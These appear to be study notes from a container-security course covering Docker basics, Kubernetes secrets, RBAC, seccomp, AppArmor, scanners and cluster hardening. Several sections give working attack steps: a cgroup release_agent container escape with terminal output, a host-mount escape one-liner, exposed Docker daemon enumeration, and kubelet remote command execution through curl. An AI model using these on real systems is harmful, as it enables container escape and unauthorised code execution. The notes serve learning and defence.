---
title: "Container Security"
excerpt: "**Pulling Public Docker Image**"
slug: "container-security"
tags: ["nmap", "privilege-escalation"]
status: "draft"
author: "Admin"
createdAt: "2025-08-01T07:07:03.027Z"
updatedAt: "2025-08-01T07:07:03.027Z"
---

**Pulling Public Docker Image**

```shell
docker pull nginx
```

 To list docker images we can use following command,

```shell
docker image ls
```

![Pasted image 20250729100355.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729100355.png)

**Remove Docker Image**

```shell
docker image rm imagename:tag
```

![Pasted image 20250729100529.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729100529.png)

To pull the image with the tag we can use following command.

```shell
docker pull imagename:tag
```

**Running a Container :**

`docker run [OPTIONS] IMAGE_NAME [COMMAND] [ARGUMENTS...]`


![Pasted image 20250729100958.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729100958.png)
![Pasted image 20250729100920.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729100920.png)

**Example:**

`docker run -v /host/os/directory:/container/directory helloworld`
`
The -p flag allows user to expose the container port. The following example exposes port 80 from docker container to port 80 on the  host machine.

```shell
docker run -p hostport:containerport nginx
docker run -p 80:80 webserver
```

**Use and throw Docker Containers**

The --rm flag can be used to destroy the docker container once the task is completed.
```shell
docker run --rm helloworld
```

**Listing Containers**

To list all the containers that are stopped, we can use following command.

```shell
docker ps -a
```

![Pasted image 20250729101845.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729101845.png)


**Dockerfile:**


![Pasted image 20250729102323.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729102323.png)

**Docker Compose** 
docker-compose allows us to connect multiple micro-services that the application requires to function like databases, load-balancer, backend, etc. 

![Pasted image 20250729110715.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729110715.png)

**Kubernetes :**

![Pasted image 20250729130411.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729130411.png)

**Starting kubernetes in Docker**

![Pasted image 20250729153153.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729153153.png)

![Pasted image 20250729153232.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729153232.png)

To read the kubernetes secret we can use following command.

```shell
kubectl get secrets
```

![Pasted image 20250729155519.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729155519.png)

```shell
kubectl describe secret terminal-creds
```

![Pasted image 20250729155532.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729155532.png)

The secret is base64 encoded, and can be decrypted using following command.

```shell
kubectl get secret terminal-creds -o jsonpath='{.data.username}' | base64 --decode
```

```shell
kubectl get secret terminal-creds -o jsonpath='{.data.password}' | base64 --decode
```

![Pasted image 20250729155605.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729155605.png)

**Managing Secrets Using kubectl Secrets Manager**

```shell
kubectl apply -f role.yaml
```

![Pasted image 20250729160455.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729160455.png)

Here, sa stands for service account.

```shell
kubectl create sa terminal-user
kubectl create sa terminal-admin
```

![Pasted image 20250729160515.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729160515.png)

**Testing the RBAC Configuration**
After applying the RBAC, we can see that the  configuration is working as intended.

![Pasted image 20250729160704.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729160704.png)

**Container Vulnerabilities 01 : Privileged Containers:**

![Pasted image 20250729162555.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729162555.png)

**Exploit :**

```shell
root@7b7461f9882e:~# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@7b7461f9882e:~# echo 1 > /tmp/cgrp/x/notify_on_release
root@7b7461f9882e:~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@7b7461f9882e:~# echo "$host_path/exploit" > /tmp/cgrp/release_agent
root@7b7461f9882e:~# echo '#!/bin/sh' > /exploit
root@7b7461f9882e:~# echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
root@7b7461f9882e:~# chmod a+x /exploit
root@7b7461f9882e:~# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@7b7461f9882e:~# cd ..
root@7b7461f9882e:/# ls
bin  boot  dev  etc  exploit  flag.txt  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@7b7461f9882e:/# cat flag.txt
THM{MOUNT_MADNESS}
root@7b7461f9882e:/# cat exploit 
#!/bin/sh
cat /home/cmnatic/flag.txt > /var/lib/docker/overlay2/40514823f5b4459a5a8748fc31b81329a3b9a8f8ed8e373fdfb43ce43480b415/diff/flag.txt
root@7b7461f9882e:/#
```

**Vulnerability 2: Escaping via Exposed Docker Daemon**
If the docker daemon is running on the privileged mode then we can mount the root directory to the mnt directory of our docker container and escape the container shell and access the files of other users.

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![Pasted image 20250729164016.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729164016.png)

**Vulnerability 3: Remote Code Execution via Exposed Docker Daemon**

By default docker runs in port 2375 which can be found via nmap scan. If mis-configured, we can execute commands directly remotely without having access to the machine.

```shell
nmap -sV -p 2375 ip
```

![Pasted image 20250729165352.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729165352.png)

We can get the version sending a curl request to http://ip:2375/version.

```shell
curl http://10.10.222.250:2375/version
```

![Pasted image 20250729165511.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729165511.png)

**Checking the Running Containers**

```shell
docker -H tcp://ip:2375 ps
```

![Pasted image 20250729165604.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250729165604.png)

**Docker Context**
Docker context allows developer to save and swap profiles for configurations with other devices.

```shell-session
client@thm:~# docker context create
--docker host=ssh://myuser@remotehost
--description="Development Environment" 
development-environment-host 

Successfully created context "development-environment-host"
```
Once the context is made we can execute commands on it.
```shell
cmnatic@thm:~# docker context use development-environment-host  

Current context is now "development-environment-host"
```
To revert to default context we can use following command.
```shell
docker context use default
```
**TLS Encryption:**
We can use TLS certificate  to encrypt data sent between devices. When configured in TLS mode, Docker will only accept remote commands from devices that have been signed against the device you wish to execute Docker commands remotely.
```shell
server@thm:~# dockerd --tlsverify --tlscacert=myca.pem --tlscert=myserver-cert.pem --tlskey=myserver-key.pem -H=0.0.0.0:2376
```

```shell
client@thm:~# docker --tlsverify --tlscacert=myca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=SERVERIP:2376 info
```
**Control Groups**

We can specify how much memory can should we give to the container or in context of linux : linux processes so that system can function smoothly.


Examples in Context of Docker:
CPU Core
```shell
docker run -it --cpus="1" mycontainer
```
Memory
```shell
docker run -it --memory="20m" mycontainer
```
**Inspecting Docker Container:**
```shell
docker inspect mycontainer

--cropped for brevity--
            "Memory": 0,
            "CpuQuota": 0,
            "CpuRealtimePeriod": 0,
            "CpuRealtimeRuntime": 0,
            "CpusetCpus": "",
            "CpusetMems": "",
            "CpuCount": 0,
            "CpuPercent": 0,
--cropped for brevity--
```
**Preventing Over-privileged Containers**


![Pasted image 20250730110314.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730110314.png)

![Pasted image 20250730110450.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730110450.png)

Examples:
```shell
cmnatic@thm:~# docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE mywebserver
```
To list the privilege what the container or user account in linux has, we can use following command.
```shell
capsh --print
```
**Seccomp and AppArmor**

Seccomp is an important security feature of Linux that restricts the actions a program can and cannot do. Seccomp allows you to create and enforce a list of rules of what actions (system calls) the application can make.

**Check Seccomp Filter** 

![Pasted image 20250730113017.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730113017.png)

**Disable Seccomp Filter**

![Pasted image 20250730113038.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730113038.png)

**Custom Seccomp Filter  to Disable Chmod :**
```shell
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "archMap": [
    {
      "architecture": "SCMP_ARCH_X86_64",
      "subArchitectures": [
        "SCMP_ARCH_X86",
        "SCMP_ARCH_X32"
      ]
    }
  ],
  "syscalls": [
    {
      "names": ["chmod"],
      "action": "SCMP_ACT_ERRNO",
      "args": [],
      "comment": "Block chmod syscall",
      "includes": {},
      "excludes": {}
    }
  ]
}

```
Usage :

1. Create a json file as profile with above code.
2. Start the container with following command.

**With SecComp Filter**

![Pasted image 20250730113537.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730113537.png)

**Without SecComp Filter** 

![Pasted image 20250730113616.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730113616.png)

**Blocking File Write in /etc Using AppArmor**

![Pasted image 20250730114015.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730114015.png)

![Pasted image 20250730114050.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730114050.png)


Compliance Frameworks:
NIST SP 800-190, ISO 27001


|                       |                                                                                                                                                                                                           |                                                                                            |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| **Benchmarking Tool** | **Description**                                                                                                                                                                                           | **URL**                                                                                    |
| CIS Docker Benchmark  | This tool can assess a container's compliance with the CIS Docker Benchmark framework.                                                                                                                    | [https://www.cisecurity.org/benchmark/docker](https://www.cisecurity.org/benchmark/docker) |
| OpenSCAP              | This tool can assess a container's compliance with multiple frameworks, including CIS Docker Benchmark, NIST SP-800-190 and more.                                                                         | [https://www.open-scap.org/](https://www.open-scap.org/)                                   |
| Docker Scout          | This tool is a cloud-based service provided by Docker itself that scans Docker images and libraries for vulnerabilities. This tool lists the vulnerabilities present and provides steps to resolve these. | [https://docs.docker.com/scout/](https://docs.docker.com/scout/)                           |
| Anchore               | This tool can assess a container's compliance with multiple frameworks, including CIS Docker Benchmark, NIST SP-800-190 and more.                                                                         | [https://github.com/anchore/anchore-engine](https://github.com/anchore/anchore-engine)     |
| Grype                 | This tool is a modern and fast vulnerability scanner for Docker images                                                                                                                                    | [https://github.com/anchore/grype](https://github.com/anchore/grype)                       |
```shell
cmnatic@thm:~# docker scout cves local://nginx:latest
✓ SBOM of image already cached, 215 packages indexed     ✗ Detected 22 vulnerable packages with a total of 45 vulnerabilities  
## Overview                     │       Analyzed Image          ────────────────────┼──────────────────────────────   
Target            │  local://nginx:latest
digest          │  4df6f9ac5341
platform        │ linux/amd64
vulnerabilities │    0C     1H    18M    28L
size            │ 91 MB
packages        │ 215
## Packages and Vulnerabilities
0C     1H     1M     3L  glibc 2.35-0ubuntu3.1 
pkg:deb/ubuntu/glibc@2.35-0ubuntu3.1?os_distro=jammy&os_name=ubuntu&os_version=22.04     
✗ HIGH CVE-2023-4911       
https://scout.docker.com/v/CVE-2023-4911
Affected range : <2.35-0ubuntu3.4                                     
Fixed version  : 2.35-0ubuntu3.4                                      
CVSS Score     : 7.8                                                  

CVSS Vector    : CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H            
✗ MEDIUM CVE-2023-5156       https://scout.docker.com/v/CVE-2023-5156       

------truncked----------

```
**Grype in Action**
```shell
 grype struts2 --scope all-layers
```
![Pasted image 20250730120419.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730120419.png)

Scanning Local Container
```shell
 grype /root/struts2.tar --scope all-layers
```
# Cluster Hardening

**Introduction:**
Kubernetes cluster contains nodes, and Kubernetes runs a workload by placing containers into pods that run on these nodes. Kubernetes cluster lives at the highest level of our Kubernetes architecture and comprises all the lower-level components. **Cluster hardening** is the practice of ensuring your Kubernetes Cluster has as few of these vulnerabilities, default configurations and as many secure practices in place. 

**CIS Security Benchmark**
CIS provides security benchmarks for many different technologies (including browser, database and cloud technologies). 


Some examples of CIS Kubernetes security benchmarks: 

1. **For the API Server:** `1.2.25 Ensure that the --tls-cert-file and --tls-private-key-file arguments are set as appropriate` 
2. For the Kubelet Component: `4.2.1 Ensure that the --anonymous-auth argument is set to false` (if left 'true' kubelet will allow anonymous traffic; )
3. For network policies: `5.3.2 Ensure that all Namespaces have Network Policies defined` (By default, there will be no network policies in place to restrict pod-to-pod communication )


![Pasted image 20250730160509.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730160509.png)
Figure : Kubernetes API Communication





**Kubebench Tool** 

Helps to perform automated assessments to check if Kubernetes has been implemented using best cluster hardening practices.

Output Snippet
```bash
[INFO] 4 Worker Node Security Configuration
[INFO] 4.1 Worker Node Configuration Files
[FAIL] 4.1.1 Ensure that the kubelet service file permissions are set to 600 or more restrictive (Automated)
[PASS] 4.1.2 Ensure that the kubelet service file ownership is set to root:root (Automated)
[WARN] 4.1.3 If proxy kubeconfig file exists ensure permissions are set to 600 or more restrictive (Manual)
[WARN] 4.1.4 If proxy kubeconfig file exists ensure ownership is set to root:root (Manual)
[PASS] 4.1.5 Ensure that the --kubeconfig kubelet.conf file permissions are set to 600 or more restrictive (Automated)
[PASS] 4.1.6 Ensure that the --kubeconfig kubelet.conf file ownership is set to root:root (Automated)
[WARN] 4.1.7 Ensure that the certificate authorities file permissions are set to 600 or more restrictive (Manual)
[WARN] 4.1.8 Ensure that the client certificate authorities file ownership is set to root:root (Manual)
[FAIL] 4.1.9 If the kubelet config.yaml configuration file is being used validate permissions set to 600 or more restrictive (Automated)
[PASS] 4.1.10 If the kubelet config.yaml configuration file is being used validate file ownership is set to root:root (Automated)
[INFO] 4.2 Kubelet
[PASS] 4.2.1 Ensure that the --anonymous-auth argument is set to false (Automated)
[PASS] 4.2.2 Ensure that the --authorization-mode argument is not set to AlwaysAllow (Automated)
[PASS] 4.2.3 Ensure that the --client-ca-file argument is set as appropriate (Automated)
[PASS] 4.2.4 Verify that the --read-only-port argument is set to 0 (Manual)
[PASS] 4.2.5 Ensure that the --streaming-connection-idle-timeout argument is not set to 0 (Manual)
[PASS] 4.2.6 Ensure that the --make-iptables-util-chains argument is set to true (Automated)
[WARN] 4.2.7 Ensure that the --hostname-override argument is not set (Manual)
[PASS] 4.2.8 Ensure that the eventRecordQPS argument is set to a level which ensures appropriate event capture (Manual)
[WARN] 4.2.9 Ensure that the --tls-cert-file and --tls-private-key-file arguments are set as appropriate (Manual)
[PASS] 4.2.10 Ensure that the --rotate-certificates argument is not set to false (Automated)
[PASS] 4.2.11 Verify that the RotateKubeletServerCertificate argument is set to true (Manual)
[WARN] 4.2.12 Ensure that the Kubelet only makes use of Strong Cryptographic Ciphers (Manual)
[WARN] 4.2.13 Ensure that a limit is set on pod PIDs (Manual)
```
**Remote Code Execution in Containers Via Exposed Kubernetes** 
The kubelet is an agent that runs on every worker node in a Kubernetes cluster. Its main job is to receive instructions from the main Kubernetes API server and ensure containers are running as they should be within "pods". 

The kubelet component listens for requests on the following ports: 
a. **Port 10250:** Where it serves the kublet-api and allows for full access 
b **Port 10255:** Where it serves another API which has unauthorised, unauthenticated read-only access

The vulnerability arises from insecure **default settings** in some Kubernetes installations:

Anonymous Authentication is Enabled: The kubelet is configured with the flag --anonymous-auth=true. This means anyone who can reach the kubelet on the network can connect to its API without needing to provide a username, password, or certificate.

Authorization is Too Permissive: The kubelet is configured with --authorization-mode=AlwaysAllow. This tells the kubelet to approve any request from any user (including the anonymous ones from the point above).

Methodology:
1. Scan the network using kubeletctl. This checks for port 10250 in network.
```shell
kubeletctl scan --subnet 192.168.1.0/24
```
2. Once a target node is found, the attacker gathers information about what is running on it. The most valuable information is the list of active pods and containers.
```shell
kubeletctl pods 
```
![Pasted image 20250730154729.png](/placeholder.svg?height=400&width=600&query=Pasted%20image%2020250730154729.png)

3.
```shell
curl -ks -X POST https://<node_ip>:10250/run/<namespace>/<pod>/<container> -d "cmd=ls /""
```
For Kubernetes v1.9 or less :
```shell
curl -k -H "Connection: Upgrade" \ 
        -H "Upgrade: SPDY/3.1" \ 
        -H "X-Stream-Protocol-Version: v2.channel.k8s.io" \ 
        -H "X-Stream-Protocol-Version: channel.k8s.io" \ 
        -X POST "https://<node_ip>:10250/exec/<podNamespace>/<podID>/<containerName>?command=ls&command=/&input=1&output=1&tty=1"
```
References:
https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster


**Admission Controller:**
Admission Controller perform checks against what the request is doing to ensure it's not going to expend needless resources or implement an insecure practice. 

Characters:
**Mutating:** This means the admission controller can modify the object related to the request they admit. For example an admission controller which ensures a pod configuration is set to a certain value. The admission controller would receive the request to create a pod and change (or mutate) this configuration value before persistence.

**Validating:** This means the admission controller validates the request data to approve or deny the request. For example, if the admission controller receives a request to create a pod but doesn't have a specific label, it is rejected.

**Built-In**

Kubernetes comes with many built-in admission controllers, which are compiled into the kube-apiserver binary and, therefore, can only be configured by a cluster administrator. Some examples of built-in admission controllers and what their function/check is: 

AlwaysPullImages: This admission controller modifies all new pods and enforces the "Always" ImagePullPolicy. This is the kind of AdmissionController we want to enable as it ensures that pods always pull the latest version of the container image while mitigating supply chain attacks. Enabling implements CIS Security Benchmark 1.2.11.

**EventRateLimit:** This admission controller helps avoid a problem where the Kubernetes API gets flooded with requests to store new events. Setting this limit implements CIS Security Benchmark 1.2.9.

**ServiceAccount:** Again, this admission controller is strongly recommended to be enabled (by Kubernetes themself); it ensures that default service accounts are created for pod which don't specify one. This prevents pods from running without an associated service account which can lead to privilege escalation. Enabling implements CIS Security Benchmark 1.2.13.

**Restricting pod-to-pod Communication with Network Policies**
```shell
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: db-ingress-policy #policy name
spec:
  podSelector:
    matchLabels:
      app: database #label of app you want to protect
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: api #label of app you want to allow traffic from
    ports:
    - protocol: TCP
      port: 8080 #port you want to allow traffic on
```

To apply the policy we must specify following commmand.
`kubectl apply -f <network-policy-name>.yaml`